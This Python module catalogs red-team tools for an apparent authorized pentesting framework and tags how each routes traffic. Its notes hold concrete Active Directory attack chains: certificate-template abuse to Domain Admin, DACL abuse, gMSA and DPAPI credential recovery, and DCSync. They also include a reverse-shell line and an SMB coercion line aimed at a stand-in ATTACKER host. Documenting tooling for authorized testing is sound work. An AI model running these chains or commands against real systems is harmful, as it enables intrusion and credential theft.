"""External red-team tool catalog: purpose, install, and Burp-routing tier.

Praetor's web lane (Rule 26a) needs every request to land in Burp for a
replayable logger_index. Tools are tagged by how they fit that model:

  tier "A" - emits HTTP or is offline; wraps cleanly via tools/recon/_common
             `_run_cmd` (auto HTTPS_PROXY -> Burp) or produces a local artifact.
  tier "B" - pure knowledge (no execution); see lookup_gtfobins / lookup_lolbas.
  tier "C" - speaks SMB/LDAP/Kerberos/raw-TCP or runs on a compromised host;
             Burp cannot capture it, so it needs a separate evidence lane
             (pcap / session log / loot file under .burp-intel/<domain>/).
             NOT yet wired — listed so the roadmap is explicit, not silent.

`routes_burp` is whether the tool's traffic can go through Burp's HTTP proxy.
`install` gives the Kali apt name first (operator's stated platform), then a
clone/pipx fallback for non-Kali hosts.
"""

from __future__ import annotations

REDTEAM_TOOLS: dict[str, dict] = {
    # ── Tier A: web content discovery (routes through Burp) ──
    "gobuster": {
        "tier": "A", "routes_burp": True,
        "purpose": "Directory/vhost/DNS brute-force (dir, dns, vhost, fuzz modes).",
        "install": {"kali": "sudo apt install gobuster", "other": "go install github.com/OJ/gobuster/v3@latest"},
        "note": "Pass --proxy http://127.0.0.1:8080 so results land in Burp. Overlaps run_ffuf/dirbust.",
    },
    "feroxbuster": {
        "tier": "A", "routes_burp": True,
        "purpose": "Recursive content discovery; fast, auto-recursion.",
        "install": {"kali": "sudo apt install feroxbuster", "other": "cargo install feroxbuster"},
        "note": "--proxy http://127.0.0.1:8080 for Burp capture.",
    },
    "arjun": {
        "tier": "A", "routes_burp": True,
        "purpose": "HTTP hidden-parameter discovery.",
        "install": {"kali": "sudo apt install arjun", "other": "pipx install arjun"},
        "note": "Complements discover_hidden_parameters. Set proxy via -oJ + burp env.",
    },
    # ── Tier A: offline (no network / no Burp needed) ──
    "sqlmap": {
        "tier": "A", "routes_burp": True,
        "purpose": "Automated SQLi detection/exploitation. ALREADY WRAPPED (run_sqlmap).",
        "install": {"kali": "sudo apt install sqlmap", "other": "pipx install sqlmap"},
        "note": "run_sqlmap already routes --proxy to Burp. Rule 7: dump version()/current_user(), not real data.",
    },
    "msfvenom": {
        "tier": "A", "routes_burp": False,
        "purpose": "Payload/shellcode generation (part of Metasploit).",
        "install": {"kali": "sudo apt install metasploit-framework", "other": "https://github.com/rapid7/metasploit-framework"},
        "note": "Offline generation -> artifact under .burp-intel/<domain>/artifacts/. Metasploit exec already wired (msfrpc).",
    },
    "hashcat": {
        "tier": "A", "routes_burp": False,
        "purpose": "OFFLINE hash cracking (GPU). Cracks captured hashes.",
        "install": {"kali": "sudo apt install hashcat", "other": "https://hashcat.net/hashcat/"},
        "note": "Offline cracking of already-obtained hashes is NOT Rule 6 credential brute-force (that rule is online cred spraying).",
    },
    "john": {
        "tier": "A", "routes_burp": False,
        "purpose": "OFFLINE hash cracking (John the Ripper).",
        "install": {"kali": "sudo apt install john", "other": "https://github.com/openwall/john"},
        "note": "Same Rule 6 scope note as hashcat — offline, allowed.",
    },
    "seclists": {
        "tier": "A", "routes_burp": False,
        "purpose": "Wordlist collection. Auto-detected by detect_seclists().",
        "install": {"kali": "sudo apt install seclists", "other": "git clone https://github.com/danielmiessler/SecLists /opt/SecLists"},
        "note": "Praetor caches the path to .burp-intel/_seclists_path.json.",
    },
    # ── Tier C: internal / AD / post-ex (Burp-blind — needs a new lane) ──
    "impacket": {
        "tier": "C", "routes_burp": False,
        "purpose": "SMB/LDAP/Kerberos toolkit: secretsdump, psexec, wmiexec, GetUserSPNs, ntlmrelayx.",
        "install": {"kali": "sudo apt install impacket-scripts python3-impacket", "other": "pipx install impacket"},
        "note": "SMB/Kerberos — Burp-blind. Evidence = session log + loot files, not logger_index.",
    },
    "netexec": {
        "tier": "C", "routes_burp": False,
        "purpose": "SMB/WinRM/LDAP/MSSQL spray + exec + enum (nxc; successor to crackmapexec).",
        "install": {"kali": "sudo apt install netexec", "other": "pipx install git+https://github.com/Pennyw0rth/NetExec"},
        "note": "Password spray touches Rule 6 — needs explicit authorization + spray (not dictionary brute).",
    },
    "bloodhound": {
        "tier": "C", "routes_burp": False,
        "purpose": "AD attack-path graph. Collect with bloodhound-python / SharpHound.",
        "install": {"kali": "sudo apt install bloodhound", "other": "pipx install bloodhound-ce; SharpHound.exe on host"},
        "note": "LDAP collection is Burp-blind. Ingest graph + query shortest-path-to-DA. Praetor: ingest_bloodhound / sync_bloodhound_to_ghostwriter parse ACL/DCSync/ESC/trust/delegation edges. Kerberos-only domains: collect with `-k` + a krb5.conf. rusthound-ce is a faster Rust collector.",
    },
    "rusthound-ce": {
        "tier": "C", "routes_burp": False,
        "purpose": "Fast Rust BloodHound-CE collector — LDAP -> JSON for the graph.",
        "install": {"kali": "cargo install / release binary", "other": "https://github.com/g0h4n/RustHound-CE"},
        "note": "`rusthound-ce -d dom.htb -u user -p pass -o out/` (add `-k`/`-z` for Kerberos-only). Feed the JSON to ingest_bloodhound. Alternative to bloodhound-python / `nxc --bloodhound -c All`.",
    },
    "targetedkerberoast": {
        "tier": "C", "routes_burp": False,
        "purpose": "WriteSPN abuse — temporarily set an SPN on a target you control, roast it, clean up.",
        "install": {"kali": "clone", "other": "https://github.com/ShutdownRepo/targetedKerberoast"},
        "note": "`targetedKerberoast.py -v -d dom.htb -u <you> -p <pw> --request-user <target>` (needs WriteSPN/GenericWrite over <target>). Emits a $krb5tgs$ hash -> crack_hashes(domain,'kerberoast'). Cleans up the SPN automatically. Manual equivalent: bloodyAD set object <target> servicePrincipalName <fake/spn> ; GetUserSPNs -request ; then unset.",
    },
    "gmsadumper": {
        "tier": "C", "routes_burp": False,
        "purpose": "Dump gMSA managed passwords (msDS-ManagedPassword) you're authorized to read.",
        "install": {"kali": "clone", "other": "https://github.com/micahvandeusen/gMSADumper"},
        "note": "`gMSADumper.py -u <you> -p <pw> -d dom.htb` -> the gMSA NT hash (and aes keys). Needs group membership granting ReadGMSAPassword (BloodHound `readgmsapassword` edge). Alternatives: `bloodyAD get object '<gmsa$>' --attr msDS-ManagedPassword`, `nxc ldap --gmsa`. Use the hash with `-H` / `-k`.",
    },
    "bloodyad": {
        "tier": "C", "routes_burp": False,
        "purpose": "AD DACL/attribute abuse toolkit — the Swiss-army knife for ACL-edge exploitation.",
        "install": {"kali": "pipx install bloodyAD", "other": "https://github.com/CravateRouge/bloodyAD"},
        "note": "Prefix: `bloodyAD --host dc.dom.htb -d dom.htb -u user -p pass --kerberos` (or `-p :<nthash>`). Verbs: `get writable` (what you can edit), `add groupMember <group> <member>` (AddSelf/AddMember), `set owner <target> <you>` + `add genericAll <target> <you>` (WriteOwner -> own -> full control chain), `set password <user> <pw>` (ForceChangePassword — no target-account destruction, Rule 8 note applies), `remove groupMember 'Protected Users' <user>` (lift Protected-Users restrictions to allow Kerberos), `add rbcd <target> <attacker>` (AddAllowedToAct -> RBCD), `get object '<gmsa$>' --attr msDS-ManagedPassword` (ReadGMSAPassword), `set object <target> servicePrincipalName <spn>` (WriteSPN -> targeted Kerberoast). The modern replacement for net rpc / pywhisker chains.",
    },
    "responder": {
        "tier": "C", "routes_burp": False,
        "purpose": "LLMNR/NBT-NS/mDNS poisoning -> NetNTLM capture.",
        "install": {"kali": "sudo apt install responder", "other": "git clone https://github.com/lgandx/Responder"},
        "note": "Link-layer capture; loot = captured hashes -> hashcat. No HTTP through Burp.",
    },
    "mimikatz": {
        "tier": "C", "routes_burp": False,
        "purpose": "Windows credential/ticket extraction (on-host).",
        "install": {"kali": "n/a (Windows binary)", "other": "https://github.com/gentilkiwi/mimikatz"},
        "note": "Runs on a compromised host, not the operator box. Output = loot artifact.",
    },
    "ligolo-ng": {
        "tier": "C", "routes_burp": False,
        "purpose": "Reverse TCP/TUN tunneling for pivoting into internal segments.",
        "install": {"kali": "sudo apt install ligolo-ng", "other": "https://github.com/nicocha30/ligolo-ng/releases"},
        "note": "Infrastructure/pivot, not a scan. Alternatives: chisel, sshuttle.",
    },
    "certipy": {
        "tier": "C", "routes_burp": False,
        "purpose": "AD Certificate Services abuse (ESC1-16 enumeration + exploitation).",
        "install": {"kali": "sudo apt install certipy-ad", "other": "pipx install certipy-ad"},
        "note": "LDAP/RPC/HTTP-enrollment mix — mostly Burp-blind. Enum: `certipy find -u user@dom -p pw -dc-ip <ip> -vulnerable -stdout`. ESC1 exploit: `certipy req -u user@dom -p pw -ca <CA> -template <t> -upn administrator@dom -sid <domainSID>-500` (the -500 Administrator SID is REQUIRED or auth fails), then `certipy auth -pfx administrator.pfx -dc-ip <ip>` -> NT hash for Pass-the-Hash. ESC15 (EKUwu, CVE-2024-49019 — a schema-v1 template like WebServer): `certipy req ... -template WebServer -application-policies 'Client Authentication' -upn Administrator@dom`, then `certipy auth -pfx administrator.pfx -ldap-shell` and `add_user_to_group <you> 'Domain Admins'`. ESC4 (you hold write/GenericAll/WriteOwner->GenericAll over a template — see bloodyAD DACL chain): overwrite the template into a permissive ESC1 config, then exploit as ESC1. `certipy template -u ca_svc@dom -p pw -template <t> -write-default-configuration -save-old` (`-save-old` backs up the original config to restore afterward = OPSEC/cleanup), then the ESC1 `req`+`auth` above. On DNS-resolution errors pass `-target <dc-fqdn> -target-ip <dc-ip>` (the /etc/hosts entry is not always honoured). If ManageCA/enrollment ACLs are writable, create+enable a Client-Authentication template first (custom LDAP), then grant enroll rights.",
    },
    "dpapi": {
        "tier": "C", "routes_burp": False,
        "purpose": "Decrypt Windows DPAPI masterkeys + credential/vault blobs recovered from a foothold (impacket-dpapi / dpapi.py).",
        "install": {"kali": "sudo apt install impacket-scripts python3-impacket", "other": "pipx install impacket"},
        "note": "OFFLINE decrypt of already-looted artifacts (Rule 5/6 clear — no target traffic). Recover masterkey + credential blob from C:\\Users\\<u>\\AppData\\Roaming\\Microsoft\\{Protect,Credentials}, record_loot them, then: `impacket-dpapi masterkey -file <mk-guid> -sid <userSID> -password '<userpw>'` (or -pvk with the domain backup key), then `impacket-dpapi credential -file <blob> -key <decrypted-masterkey>` -> plaintext creds. Evidence = loot chain-of-custody + operator log (T1555).",
    },
    "runascs": {
        "tier": "C", "routes_burp": False,
        "purpose": "Run a process as another user from a non-interactive/service shell using a known credential (context pivot without a noisy remote logon).",
        "install": {"kali": "n/a (drop RunasCs.exe on host)", "other": "https://github.com/antonioCoco/RunasCs"},
        "note": "On-host Windows binary. `RunasCs.exe <user> <pass> <cmd> --bypass-uac -r ATTACKER:PORT`. Quieter than psexec/winrm for moving svc_* -> a recovered user once DPAPI/BloodHound hands you creds. Output = loot/session, not logger_index.",
    },
    "kerbrute": {
        "tier": "C", "routes_burp": False,
        "purpose": "Kerberos pre-auth user enumeration + password spray.",
        "install": {"kali": "sudo apt install kerbrute", "other": "go install github.com/ropnop/kerbrute@latest"},
        "note": "Spray touches Rule 6; user-enum via Kerberos is enumeration, allowed.",
    },
    "mssqlclient": {
        "tier": "C", "routes_burp": False,
        "purpose": "Interactive MSSQL client (impacket) — linked-server enum + lateral RPC + xp_cmdshell.",
        "install": {"kali": "sudo apt install impacket-scripts", "other": "pipx install impacket"},
        "note": "`mssqlclient.py 'DOM/user:pw@ip' -windows-auth`. Then: `enum_links` (linked servers), `EXEC ('sp_linkedservers') AT [LINK]`, `EXECUTE AS LOGIN='sa'`, `enable_xp_cmdshell` + `xp_cmdshell whoami`. Coerce SMB auth for delegation: `xp_dirtree \\\\ATTACKER\\x` (or the linked-server's host). Lateral to the SQL service account on another instance is common.",
    },
    "rubeus": {
        "tier": "C", "routes_burp": False,
        "purpose": "Windows Kerberos abuse (on-host): ticket monitor/harvest, asktgt/asktgs, S4U, kerberoast.",
        "install": {"kali": "n/a (drop Rubeus.exe on host)", "other": "https://github.com/GhostPack/Rubeus (compile) / SharpCollection"},
        "note": "On the compromised host. `Rubeus.exe monitor /interval:10 /nowrap` harvests TGTs an unconstrained-delegation host receives (coerce a DC first). `Rubeus.exe dump` / `asktgt`. Base64 ticket -> ticketConverter.py -> .ccache for impacket on Kali.",
    },
    "petitpotam": {
        "tier": "C", "routes_burp": False,
        "purpose": "MS-EFSRPC coercion — force a target (DC) to authenticate to you.",
        "install": {"kali": "pipx/clone", "other": "https://github.com/topotam/PetitPotam"},
        "note": "`PetitPotam.py <listener-ip> <dc-ip>`. Pair with krbrelayx (unconstrained-deleg capture) or ntlmrelayx (relay to AD CS / LDAP). Alternatives: printerbug.py (MS-RPRN), dfscoerce.py, coercer. Coercion, not brute — Rule 6 clear.",
    },
    "krbrelayx": {
        "tier": "C", "routes_burp": False,
        "purpose": "Capture/relay Kerberos on an unconstrained-delegation host — decrypt the coerced TGT.",
        "install": {"kali": "clone", "other": "https://github.com/dirkjanm/krbrelayx"},
        "note": "Run on your unconstrained-delegation foothold with the host account key; coerce the DC (PetitPotam) so its TGT lands here, then extract + secretsdump -k. The non-Windows equivalent of Rubeus monitor.",
    },
    "ticketconverter": {
        "tier": "C", "routes_burp": False,
        "purpose": "Convert Kerberos tickets between .kirbi (Windows/Rubeus) and .ccache (impacket).",
        "install": {"kali": "sudo apt install impacket-scripts", "other": "pipx install impacket"},
        "note": "Pipeline: base64 -d ticket.b64 > ticket.kirbi ; ticketConverter.py ticket.kirbi out.ccache ; export KRB5CCNAME=out.ccache. Generate the realm file with `nxc smb dc -u u -p p --generate-krb5-file ./krb5.conf` then `export KRB5_CONFIG=./krb5.conf`. Then impacket -k -no-pass (e.g. secretsdump for DCSync).",
    },
    "hydra": {
        "tier": "C", "routes_burp": False,
        "purpose": "Network login brute-force (many protocols).",
        "install": {"kali": "sudo apt install hydra", "other": "https://github.com/vanhauser-thc/thc-hydra"},
        "note": "CONFLICTS with HARD Rule 6 (no credential brute-force). Only default/known-cred checks or authorized spray — dictionary brute is refused.",
    },
    # ── Tier C: Linux post-foothold enumeration (run on the compromised host) ──
    # Burp-blind; drop the script on the host and read its output. See
    # playbook-linux-privesc.md for the methodology these feed.
    "pspy": {
        "tier": "C", "routes_burp": False,
        "purpose": "Watch processes + cron/background jobs in real time WITHOUT root — surfaces root jobs `crontab -l` hides.",
        "install": {"kali": "download a release binary", "other": "https://github.com/DominicBreuker/pspy/releases"},
        "note": "Run FIRST on any Linux foothold: `./pspy64 -pf -i 1000`. The single highest-signal enum tool for cron/timer privesc. No install on target — drop the static binary.",
    },
    "linpeas": {
        "tier": "C", "routes_burp": False,
        "purpose": "All-in-one Linux privesc enumerator (sudo, SUID/SGID, caps, cron, creds, kernel).",
        "install": {"kali": "in peass-ng / seclists; or curl the script", "other": "https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS"},
        "note": "`./linpeas.sh -a` for full. Run AFTER a manual triage pass (playbook-linux-privesc §1) so you know what it is confirming. Colour key: red/yellow = 95% a privesc path.",
    },
    "linux-exploit-suggester": {
        "tier": "C", "routes_burp": False,
        "purpose": "Map `uname -a` + userland to known kernel/pkg privesc CVEs.",
        "install": {"kali": "curl the script", "other": "https://github.com/The-Z-Labs/linux-exploit-suggester"},
        "note": "`./linux-exploit-suggester.sh`. Kernel-CVE path is the LAST resort (noisy, can panic the box) — exhaust config/cred vectors first. Cross-check with lookup_cve before firing.",
    },
    "linux-smart-enumeration": {
        "tier": "C", "routes_burp": False,
        "purpose": "Levelled Linux enum (lse.sh) — quieter, more selective than linpeas.",
        "install": {"kali": "curl the script", "other": "https://github.com/diego-treitos/linux-smart-enumeration"},
        "note": "`./lse.sh -l1` (interesting) then `-l2` (verbose). Good second opinion when linpeas output is overwhelming.",
    },
    "linenum": {
        "tier": "C", "routes_burp": False,
        "purpose": "Classic Linux enumeration script (SUID, cron, network, creds).",
        "install": {"kali": "curl the script", "other": "https://github.com/rebootuser/LinEnum"},
        "note": "`./LinEnum.sh -t` (thorough). Older but still useful; overlaps linpeas.",
    },
    "linuxprivchecker": {
        "tier": "C", "routes_burp": False,
        "purpose": "Python privesc checker — enumerate + suggest exploit paths.",
        "install": {"kali": "curl the script", "other": "https://github.com/sleventyeleven/linuxprivchecker"},
        "note": "Needs python on target. Complements linpeas; weaker on modern caps/systemd.",
    },
}
